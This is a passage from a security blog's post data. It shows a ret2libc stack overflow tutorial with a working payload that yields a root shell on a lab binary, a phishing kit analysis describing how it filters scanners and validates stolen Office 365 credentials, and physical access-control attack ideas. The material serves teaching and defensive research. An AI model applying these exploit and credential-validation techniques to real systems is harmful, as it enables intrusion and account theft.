ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n"},{"title":"Phishing/Scam campaign research (ep. 2)","slug":"phishing-campaign-research-ep-2","date_published":1541023030000,"date_updated":1542245609000,"tags":["research","phishing"],"excerpt":"I got another email. This one was interesting, the email was the standard \"we had a rat on your computer that we used to take dirty pictures of you, give us money or we will  send it to all your contacts\".","cover":"2018/11/chrome_2018-11-14_11-31-28.png","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nI got another email. This one was interesting, the email was the standard \"we had a rat on your computer that we used to take dirty pictures of you,  give us money or we will  send it to all your contacts\". \n\nThis is the email that I received.\n\n![](2018/10/image-17.png \"The scam email\")\n\nIt's a fairly standard \"give us money or we send dirty photos we took to your contacts\" kind of scam email, but this one actually does something that I have not seen previously. The scammers establish \"credibility\" by actually telling you what your password is. The scammers purchased a dumped site database (that assumedly did not hash or salt passwords), correlated the email address in the DB, and sent out an email.\n\nThis scam is incredibly effective when you consider that a vast majority of people use the same password for every account. \n\nThis scam also does something unique; they spoofed the sender of this email  to be me. \n\n    Delivered-To: hello@[redacted]\n    Received-SPF: none (zoho.com: 171.99.132.162 is neither permitted nor denied by domain of [redacted]) client-ip=171.99.132.162; envelope-from=hello@[redacted]; helo=171-99-132-162.static.asianet.co.th;\n    Authentication-Results: mx.zohomail.com;\n        spf=none (zoho.com: 171.99.132.162 is neither permitted nor denied by domain of [redacted])  smtp.mailfrom=hello@[redacted]\n    Received: from 171-99-132-162.static.asianet.co.th (171-99-132-162.static.asianet.co.th [171.99.132.162]) by mx.zohomail.com\n        with SMTP id [redacted]; Mon, 29 Oct 2018 19:47:47 -0700 (PDT)\n\nThis was an interesting way of finding out that my mail server has incorrectly configured SPF records. This establishes ~darknet spooky hacker credibility~ by sending an email as you. \n\nI am going to take a shot in the dark that they try several different techniques to do this. The first, is just standard SPF record spoofing to send the message. Since the boilerplate message contains `Please don't try to contact me or find me, it is impossible, since I sent you an email from your email account.`, I am going to assume that sending mail as the recipient is part of the scam in general. \n\nI also have another theory, that when they send the mail, if SPF records prevent spoofing, that they then try to authenticate with the target mail server to craft the email using the harvested credentials. This would also prove to the scammers if the harvested credentials were valid. This is a technique that has been seen in the wild in previous phishing campaigns, talked about [here](https://research.801labs.org/phishing-campaign-research/).\n\nDigging a little deeper and looking at the email headers above, the IP that sent the email is `171.99.132.162`. This IP appears to be a standard telecom IP address, belonging to a Broadband ISP located out of Bangkok, Thailand. \n\n![](2018/11/image.png)\n\nRiskiq also only has two carrier-assigned DNS records for this IP address\n\n![](2018/11/image-1.jpg)\n\nIt appears that this IP is for sure a private (possibly residential IP). Is this IP the actual IP of the scammer? I hope they they wouldn't be so dumb, but who knows. Lets poke at it on [Shodan](https://www.shodan.io). \n\n![](2018/11/image-2.png)\n\nThe only running service on this host is a web server. Ohhh boy, that's great. Since there was no DNS record for a TLD pointing towards this IP, it's safe to assume that it is a residential/business host that opened up a web server for something, or the scammer is running this from their home IP and has a web server running. Lets see whats on it. \n\n![](2018/11/image-3.jpg)\n\nIt appears this IP address is hosting a Hikvision camera control panel. Cameras are the number one compromised host for botnets or malicious activity on the internet. It's easy to assume that the person hosting this publicly accessible camera control panel left it with default passwords, and somebody logged in and compromised one of the cameras, adding it to a botnet. \n\nAside from trying to log in (illegal) there's nothing more I can do for this research. :(\n"},{"title":"ASCII art in hidden places","slug":"ascii-art-in-hidden-places","date_published":1540949125000,"date_updated":1540949125000,"tags":["research","how to"],"excerpt":"Hiding data in new and interesting places has always been a fun objective for anyone who likes creating and solving challenges. One of the interesting secret hiding places for data I like to use is server headers.","cover":"2018/10/4TJDOj5.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nHiding data in new and interesting places has always been a fun objective for anyone who likes creating and solving challenges. One of the interesting secret hiding places for data I like to use is server headers. \n\nI found out that you can override server headers live in-page with PHP's `header()` function. Combine this with some ascii art, and in the header of a server response you can now show people super hidden ascii art.\n\n![](2018/10/image-15.png)\n\nHere's the code to make it happen. Replace the `$subject` with new ascii art. \n\n    <?php\n    $i = 0;\n    $subject= \"\n    #    ,-''''-.\n    #   (.  ,.   L        ___...__\n    #   /7} ,-`  `'-==''``        ''._\n    #  //{                           '`.\n    #  \\_,X ,                         : )\n    #      7                          ;`\n    #      :                  ,       /\n    #       \\_,                \\     ;\n    #         Y   L_    __..--':`.    L\n    #         |  /| ````       ;  y  J\n    #         [ j J            / / L ;\n    #         | |Y \\          /_J  | |\n    #         L_J/_)         /_)   L_J\n    #        /_)                   /_)\";\n    $header_name= \"blackmagic-\";\n    foreach(preg_split(\"/((\\r?\\n)|(\\r\\n?))/\", $subject) as $line){\n    \n        $pre = \"\";\n        if($i<10)\n            $pre = \"00\";\n        elseif ($i<100)\n            $pre = \"0\";\n    \n    \n    \n        header( \"{$header_name}{$pre}{$i}: {$line}\");\n        $i++;\n    \n    }\n    ?>\n    \n    \n"},{"title":"Phishing/Scam campaign research","slug":"phishing-campaign-research","date_published":1540617176000,"date_updated":1541023021000,"tags":["research","phishing"],"excerpt":"An email came in that an end user thought was suspicious. The end user passed it up to one of our team members, who then passed it up to me.","cover":"2018/10/image-3.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nAn email came in that an end user thought was suspicious. The end user passed it up to one of our team members, who then passed it up to me.\n\n![](2018/10/image.jpg \"Initial phishing email\")\n\nTo start off, this email is just dumb. The sender never bothered to copy legitimate Microsoft email formatting, and the wording is just strange. It doesn’t inspire even the most inexperienced users to “***rectify password expiration***”. Just for fun, let’s look at the url.\n \n![](2018/10/image-2.jpg \"Suspicious url\")\n\n`hxxp://piba.org.br` isn’t a known phishing site, it goes to a Portuguese church website. The site doesn’t matter, what does matter is it looks like the script is being ran through a compromised WordPress site, since it’s going through a `/wp-content/` uploads folder. It appears that somebody could upload a script to the WordPress site that acts as a pass-through to further obfuscate and prevent the campaign from being detected.\n\nOnce you click the link that passes through WordPress, you end up at a not-so-convincing office 365 login page.\n\n![](2018/10/image-3.jpg \"Bad credential harvesting page\")\n\nThe email address in the link autofills the email box for your account. Let’s point out some interesting things about this scam site though. \n\n- the copyright on the bottom of the page has the **wrong year**.\n- The site doesn't fill the entire page.\n- The buttons and links don't work\n\n Why don’t they work? Because they’re **images**.\n \n![](2018/10/image-4.jpg \"Everything is a background image, instead of HTML/CSS\")\n\nLet’s look at the url and domain. `hxxp://fwclub.co.za/` is a winemaker’s club. It also doesn’t appear to be running any special framework either that would be exploitable.\n\n![](2018/10/image-5.jpg \"No interesting services detected\")\n\nThere are quite a few open ports as well on this server, four of them are CPanel. It’s possible that the person running this phishing campaign got access to the site’s CPanel and piggybacked off their normal traffic.\n\nBack to the original url, `hxxp://fwclub.co.za/includes/Office1/Login.php`. If we try one directory up, `/Office1/`, it redirects back to this script. So, lets go up another directory to `/includes/`.\n\n![](2018/10/image-6.jpg \"All the scripts!\")\n\nHmm, looks like directory listing is turned on, and… there’s a recent backup of their phishing campaign. Let’s look at this backup.\n\n![](2018/10/image-7.jpg)\n\nYup, that’s the source code to the credential dumping code. A day later, the domain is shut down in one form or another :(\n \n![](2018/10/image-8.jpg)\n\nSophos also flagged the site, finally.\n\n![](2018/10/image-9.jpg)\n\nWell, we’ve still got their source code, so let’s take a look. \n\n`blocker.php` is a very interesting file.\n\n![](2018/10/image-10.jpg)\n\nThe code uses a function I’ve never actually seen in PHP before, `gethostbyaddr()`, which attempts to lookup the incoming IP address to a hostname and possibly an identifier, like as Google or AWS, as well as the host names for a few other malware and phishing scanners.\n\nIt also has a list of banned IP addresses, ranges from Google, Cogent, Digital Ocean, ISC, EQNET, INSC, Amazon, Softlayer, EIG, NTT America, MX Logic, British Telecom, Nianet, Elisa, GigeNET, University Of Minnesota(?), NetVision, NET1 Plus, Unified Webhosting, MULTACOM, China Unicom, Dassault Systèmes, Hurricane Electric, CoreSpace, SITA, Orange S.A, Cyber Wurx, CYBERCON, Zayo Bandwidth, Savvis, QTS, Kasetsart University in Thailand(?), Chungnam National University in South Korea(?), RCC, USAA, Comverse, Omnico Hosting, AT&T, Marlink, Airstream, The Department of Defense Network Information Center, and DataPipe. Whew, that was a long list. \n\nThe major group of IP ranges are hosting providers that have a large amount of traffic for VPN/Proxy services. It would make sense that the Phisher’s target audience falls outside of hosting companies, it falls to individual users and companies. The second interesting group of IPs are for a few Universities, none in the list make any sense though. Only one of them has a recognized Cybersecurity course. It appears that MXLogic is also on the list, probably to avoid enterprise email filtering detection for companies that use it. I also found it a little interesting that they blocked the DoD as well.\n\nThe last bit of code simply checks if the useragent falls under msnbot, google bot, yahoo bot, etc. They also have a robots.txt that does the same thing.\n\nOnce it has checked the incoming request, the index.php file sets the header (URL) to something along the lines of  `login.php?websrc=<random numbers>&dispatched=<random numbers>&id=<random numbers>&email=<compromised email>`. It’s interesting that the phishing author attempted to make the URL look more legitimate and lengthy, as many official emails are.\n \n![](2018/10/image-11.jpg)\n\nOnce it goes to the Login.php page, it loads the two images and two text boxes that are supposed to look like, and auto fills the email address, to make it look more “authentic”.\n\nOn the form submit, it hits `logon.php` (not login). Here’s where something interesting happens. The first thing the script does, is gets the visitors country from geoplugin.net. The second thing it does, is craft a basic email and loads in the submitted username, password, ip, browser, date, and geoip lookup. It then sets the TO: field of this email to ipconfigura@gmail.com, the subject to `“Office365 | <country> | <username>”`  and lastly sets the FROM: field to `“John De Fisher <new@cpanel.com>”`.\n\n![](2018/10/image-12.jpg)\n\nAfter it crafts this email, it then runs a function called `check()` from inside a PHPMailer directory from the script `smtp.php`, and passes the submitted username and password. Let’s look at this script then.\n\n![](2018/10/image-13.jpg)\n\nThis `check()` function is incredibly clever. It connects to the office365 SMTP server, authenticates with the server using the submitted credentials, sets the FROM field to the email `hbergamini@truehomesusa.com`. This is interesting, `truehomesusa.com` doesn’t seem to be flagged and is a legitimate website, they even run on office 365. I take an educated guess and figure that this domain has not fully set up the correct MX records to protect their domain from email spoofing, allowing this test email to not be noticed by most people and not appear in anybody’s inbox. Clever. It then checks to see if the email sent. If it could send, it means that the submitted credentials successfully authenticated with Microsoft and are correct. \n\nThis is something I don’t see that often. It’s commonplace for campaigns to accept and send off any credentials it gets, but this one is checking the validity of the credentials. It also allows the phishing author to provide a “Password not recognized” message, to skeptical users who input a wrong password the first time to see if it works or not.\n \n![](2018/10/image-14.jpg)\n\nAaand that's the analysis of this phishing campaign.\n"},{"title":"Access-control exploitation (part 1)","slug":"access-control-exploitation-part-1","date_published":1540434784000,"date_updated":1540434915000,"tags":["research","RFID"],"excerpt":"One job I was tasked with was getting a fingerprint-based reader tested and operational for demoing our new level of hardware support for more secure facilities, 2 factor physical access control; something you are (fingerprint) and something you know or have. (pin/card)","cover":"2018/10/ugdTOpe.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\n### Fingerprint readers are silly\n\nDISCLAIMER: I used to work for a physical security company architecting access control and surveillance solutions. \n\nOne job I was tasked with was getting a fingerprint-based reader tested and operational for demoing our new level of hardware support for more secure facilities, 2 factor physical access control; something you are (fingerprint) and something you know or have. (pin/card)\n\nWe were given these readers to test. The readers had a TON of wiring on the back of them. The two important things that the reader pinouts contained was\n\n1. Weigand 2-pair access control wire\n2. POE-enabled RJ45 port   \n\nThe way that these readers work with existing access control systems **completely invalidates** the security benefits of using a fingerprint-based authentication system. Let me explain the architecture and design of this system.\n\nFirst, you must enrol fingerprints on the reader. You essentially scan a fingerprint a handful of times, give it a name, and assign it a badge. Wait, a badge? Yes. The reader contains a **local** database of every fingerprint in it's system, as well as a **card **associated to this fingerprint. When a fingerprint authenticates and is validated to the local database on the reader, the reader takes the card associated with that fingerprint and relays it over Wiegand wiring to an access control box. This reader is essentially functioning the exact same as a normal fingerprint-less card reader.\n\n![](2018/10/Untitled-Diagram.png \"Finger is read, authenticated against a print DB, then the card associated is passed over to the access control system\")\n\nThe fingerprint reader on the back end/access control provides the exact same level of authentication as a standard card-based system. If the reader is configured to pass through card reads (passthrough mode for 2nd factor, or for card or fingerprint setups) the fingerprints are **completely useless**.\n\n---\n\n# Potential attack 1: network permeter comprimise\n\nThis edge device has an ethernet port. \n\nWhich means it has an ethernet cable, which is going to have to tie into an internal access control network to allow it to talk to the provisioning server. Most people put their ICS on the same network. Cameras, access controls, gate controls, HVAC, etc. From the exterior of the building, you now have hardline access to an internal control network. \n\nIf this network has any kind of network security (for instance, MAC address filtering), you can pull the MAC of the fingerprint reader directly from a sticker located next to the ethernet port. Spoof that MAC and you have access.\n\n---\n\n# Potential attack 2: device fingerprint datastore compromise\n\nThe database containing **fingerprint** data is stored non-centrally, and every reader has a copy. The enrolment process is\n\n1. Scan fingerprint on central server\n2. Associate card, name, etc to fingerprint\n3. Push new user profile to all readers on the network\n4. Reader receives profile, adds it to internal datastore\n\nIf you compromise the edge device (reader), you can potentially access this database through their control software, or directly through chip-off forensics. This datastore is going to not just contain fingerprint data, of which I would consider **incredibly valuable and sensitive information**, it would also contain all associated cards for every user profile. \n\nUnless a mass card revocation is initiated, you now also have a datastore of every functioning, authenticating, door-opening card in the system. Additionally, you may have full names, positions, teams, pictures, etc for every user.\n\n---\n\n# Potential attack 3: Weigand man-in-the-middle\n\nThis isn't specifically a fingerprint reader specific attack, but it is just as effective. You can purchase a device that clamps onto the Weigand data wires and can Man-in-the-middle cards over the wire. With this, you can \n\n- offload all cards as they get sent to the access control system\n- in-line replace/denial of service on all/selected cards (lock someone out of the building)\n- Replay a functioning card without having to have a card cloner/spoofer\n\nDevices like the [ESPKey](https://redteamtools.com/espkey) are cheap ($99) and usable with bluetooth or wifi.\n\n![](2018/10/ugdTOpe.jpg \"ESPKey in-line man-in-the-middle\")\n"}],"pagination":{"totalPages":1,"totalItems":6,"currentPage":1}},"__N_SSG":true}